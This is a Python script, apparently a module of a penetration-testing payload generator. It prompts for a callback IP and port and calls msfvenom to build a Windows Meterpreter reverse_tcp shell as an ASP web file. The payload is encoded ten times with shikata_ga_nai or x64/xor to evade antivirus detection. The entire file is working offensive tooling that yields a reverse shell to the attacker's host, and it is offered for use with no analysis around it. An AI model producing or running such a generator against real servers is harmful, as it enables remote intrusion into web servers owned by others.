#!/usr/bin/python
#
import os
import subprocess as subp
from src.core import menus
from src.core.main import *
from time import sleep
from sys import exit

# interface ip
iface = iface_ip()

while 1:
	try:	
		# select payload
		selection = 0
		while selection != '1' or selection != '':
			clear()
			menus.asp_menu()
			selection = raw_input(" %sSelection (default) > %s" % (colours.bold, colours.reset))
			if selection == '1' or selection == '':
				payload = "windows/meterpreter/reverse_tcp"
				break
			if selection == '2':
				payload = "windows/x64/meterpreter/reverse_tcp"
				break
		
		# get some user info
		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
		if ip == '':
			ip = iface
		port = raw_input(" Enter a port (default 8080): ")
		if port == '':
			port = 8080
		outfile = raw_input(" Enter a name for asp file: ")
		if not outfile:
			outfile = "paygen-pl"
			
		# add asp extension
		outfile = outfile.split(".")[0]
		outfile += ".asp"				
		
		# create payload
		if selection == '1' or selection == '':
			PrintInfo("Creating payload with x10 x86/shikata_ga_nai. Please wait.\n")
			proc = subp.Popen("msfvenom -p %s lhost=%s lport=%s -e x86/shikata_ga_nai -i 10 -f asp" \
				% (payload, ip, port), shell=True, stdout=subp.PIPE)
		elif selection == '2':
			PrintInfo("Creating payload with x10 x64/xor. Please wait.\n")
			proc = subp.Popen("msfvenom -p %s lhost=%s lport=%s -e x64/xor -i 10 -a 64 -f asp" \
				% (payload, ip, port), shell=True, stdout=subp.PIPE)
		
		fw = open("output/"+outfile, "w")
		fw.write(proc.communicate()[0])
		fw.close()
		
		# return to main menu
		PrintInfo("File output/%s has been created" % outfile)
		EntContinue()
		break

	except KeyboardInterrupt:
		break
